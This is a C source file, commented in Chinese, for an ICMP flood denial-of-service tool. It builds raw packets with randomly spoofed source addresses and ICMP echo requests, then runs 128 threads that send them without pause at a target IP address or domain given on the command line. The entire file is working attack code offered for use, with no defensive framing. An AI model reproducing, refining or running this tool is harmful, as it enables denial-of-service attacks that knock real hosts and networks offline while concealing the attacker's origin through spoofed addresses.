//icmp攻击
//使用方式：./icmp ip(域名)
#include <stdio.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <errno.h>
#include <stdlib.h>
#include <time.h>
#include <pthread.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <string.h>
#include <syslog.h>
#include <arpa/inet.h>
#include <setjmp.h>
#include <errno.h>
//最多线程数
#define MAXCHILD 128
//目的IP地址
struct sockaddr_in dest;
//ICMP协议的值
static int PROTO_ICMP = -1;
//程序活动标志
static int alive = -1;
static int rawsock;
static void DoS_icmp (void )
{
    struct sockaddr_in to;
    struct ip *iph;
    struct icmp *icmph;
    char *packet;
    int pktsize = sizeof (struct ip) + sizeof (struct icmp) + 64;
    packet =(char *)malloc (pktsize);
    iph = (struct ip *) packet; //定位IP报头部
    icmph = (struct icmp *) (packet + sizeof (struct ip)); //定位上层协议位置（ICMP报文头部）
    memset (packet, 0, pktsize);
    
    //IP的版本,IPv4
    iph->ip_v = 4;
    //IP头部长度,字节数
    iph->ip_hl = 5;
    //服务类型
    iph->ip_tos = 0;
    //IP报文的总长度
    iph->ip_len = htons (pktsize);
    //标识,设置为PID
    iph->ip_id = htons (getpid ());
    //段的偏移地址
    iph->ip_off = 0;
    //TTL
    iph->ip_ttl = 255;
    //协议类型
    iph->ip_p = PROTO_ICMP;
    //校验和,先填写为0
    iph->ip_sum = 0;
    
    //发送的源地址，随机创建
    iph->ip_src.s_addr =random();
    
    //发送目标地址
    iph->ip_dst = dest.sin_addr;
    
    
    //ICMP类型为回显请求
    icmph->icmp_type = ICMP_ECHO;
    //代码为0
    icmph->icmp_code = 0;
    //由于数据部分为0,并且代码为0,直接对不为0即icmp_type部分计算
    icmph->icmp_cksum = htons (~(ICMP_ECHO << 8));
    //填写发送目的地址部分
    to.sin_family =  AF_INET;
    to.sin_addr = dest.sin_addr;
    to.sin_port = htons(0);
    //发送数据
    sendto (rawsock, packet, pktsize, 0, (struct sockaddr *) &to, sizeof (struct sockaddr));
    //放内存
    free (packet);
}
void *DoS_fun (void * ip)
{
    while(alive)
    {
        DoS_icmp();
        
    }
    return NULL;
}
//信号处理函数,设置退出变量alive
void DoS_sig(int signo)
{
    alive = 0;
}
int main(int argc, char *argv[])
{
    struct hostent * host = NULL;
    struct protoent *protocol = NULL;
    char protoname[]= "icmp";   //协议名字
    int i = 0;
    pthread_t pthread[MAXCHILD]; //线程标志数组
    int err = -1;
    socklen_t on=1;
    alive = 1;
    
    //截取信号CTRL+C
    signal(SIGINT, DoS_sig);   //设置信号处理函数
    // 参数是否数量正确
    if(argc < 2)
    {
        printf("usage : \n");
        return -1;
    }
    // 获取协议类型ICMP
    protocol = getprotobyname(protoname);  //获取指定协议的信息
    if (protocol == NULL)
    {
        perror("getprotobyname()");
        return -1;
    }
    PROTO_ICMP = protocol->p_proto;     //ICMP协议的值
    //输入的目的地址为字符串IP地址
    dest.sin_addr.s_addr = inet_addr(argv[1]);
    if(dest.sin_addr.s_addr == INADDR_NONE)
    {
        //为DNS地址
        host = gethostbyname(argv[1]);
        if(host == NULL)
        {
            perror("gethostbyname");
            return -1;
            
        }
        char str[30];
        // printf("host:%s\n",inet_ntop(host->h_addrtype,host->h_addr,str,30));
        //  dest.sin_addr=*(struct in_addr *)(host->h_addr_list[0]);
        inet_aton(inet_ntop(host->h_addrtype,host->h_addr,str,30),&(dest.sin_addr));
        
    }
    //printf("dst ip: %s\n", inet_ntoa(dest.sin_addr));
    
    // 建立原始socket
    rawsock = socket (AF_INET, SOCK_RAW, PROTO_ICMP);
    if (rawsock < 0)
    {
        perror("socket error");
        exit(1);
    }
    
    // 设置IP选项，自己构建IP报头部
    setsockopt (rawsock,IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
    //建立多个线程协同工作
    for(i=0; i<MAXCHILD; i++)
    {
        err = pthread_create(&pthread[i], NULL, DoS_fun, (void *)&i);
    }
    //等待线程结束
    for(i=0; i<MAXCHILD; i++)
        pthread_join(pthread[i], NULL);
    
    printf("over \n");
    close(rawsock);
    return 0;
}

